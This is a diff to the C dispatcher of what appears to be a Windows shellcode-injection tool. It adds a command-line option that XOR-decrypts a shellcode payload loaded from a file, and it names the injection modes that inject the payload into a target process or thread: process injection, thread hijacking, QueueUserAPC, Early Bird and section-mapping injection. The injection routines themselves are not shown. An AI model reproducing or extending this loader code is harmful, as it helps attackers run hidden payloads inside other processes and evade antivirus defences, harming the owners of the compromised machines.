@@ -1,6 +1,7 @@
 #include "techniques.h"
 #include "macros.h"
 #include "structs.h"
+#include "Encryption.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -44,6 +45,7 @@ int shellcodeinjection_main(int argc, char* argv[])
 	DWORD TID = -1;
 	char* path = NULL;
 	int technique = -1;
+	int algo = -1;
 	int count = 0;
 
 
@@ -51,9 +53,7 @@ int shellcodeinjection_main(int argc, char* argv[])
 	{
 		if (strcmp(argv[i],"-pid") == 0 && i + 1 < argc)
 		{
-			PID = atoi(argv[++i]);
-			
-			
+			PID = atoi(argv[++i]);	
 		}
 		if (strcmp(argv[i], "-tid") == 0 && i + 1 < argc)
 		{
@@ -61,25 +61,37 @@ int shellcodeinjection_main(int argc, char* argv[])
 		}
 		if (strcmp(argv[i],"-sc") == 0 && i + 1 < argc)
 		{
-			path = argv[++i];
-			
-			
+			path = argv[++i];	
 		}
 		if (strcmp(argv[i],"-t") == 0 && i + 1 < argc)
 		{
 			technique = atoi(argv[++i]);
 		}
+		if (strcmp(argv[i], "-d") == 0 && i + 1 < argc)
+		{
+			algo = atoi(argv[++i]);
+		}
+
 	}
 	if (PID == 0)
 	{
 		PID = GetCurrentProcessId();
 	}
 	infos = openshellcode(path);
+	if (algo != -1)
+	{
+		switch (algo)
+		{
+			case XOR:
+				XOR_dec(infos.shellcode, infos.size);
+				break;
 
+		}
+	}
 	switch (technique)
 	{
 
-	case 0:
+	case PROCESS_INJECTION:
 		if (PID == -1 || path == NULL)
 		{
 			error("Invalid Syntax | Run With --help for help menu");
@@ -88,7 +100,7 @@ int shellcodeinjection_main(int argc, char* argv[])
 		ProcessInjection(PID, infos.shellcode,infos.size);
 		break;
 
-	case 1:
+	case THREAD_HIJACKING:
 		if (PID == -1 || path == NULL || TID == -1)
 		{
 			error("Invalid Syntax | Run With --help for help menu");
@@ -96,7 +108,7 @@ int shellcodeinjection_main(int argc, char* argv[])
 		}
 		ThreadHijacking(PID, TID, infos.shellcode, infos.size);
 		break;
-	case 2:
+	case QUEUE_USER_APC_INJECTION:
 		if (PID == -1 || path == NULL || TID == -1)
 		{
 			error("Invalid Syntax | Run With --help for help menu");
@@ -104,7 +116,7 @@ int shellcodeinjection_main(int argc, char* argv[])
 		}
 		QueueUserAPCInjection(PID, TID, infos.shellcode, infos.size);
 		break;
-	case 3:
+	case EARLY_BIRD:
 		if (path == NULL)
 		{
 			error("Invalid Syntax | Run With --help for help menu");
@@ -112,7 +124,7 @@ int shellcodeinjection_main(int argc, char* argv[])
 		}
 		EarlyBird(infos.shellcode, infos.size);
 		break;
-	case 4:
+	case MAP_VIEW_OF_SECTION_INJECTION:
 		if (PID == -1 || path == NULL)
 		{
 			error("Invalid Syntax | Run With --help for help menu");
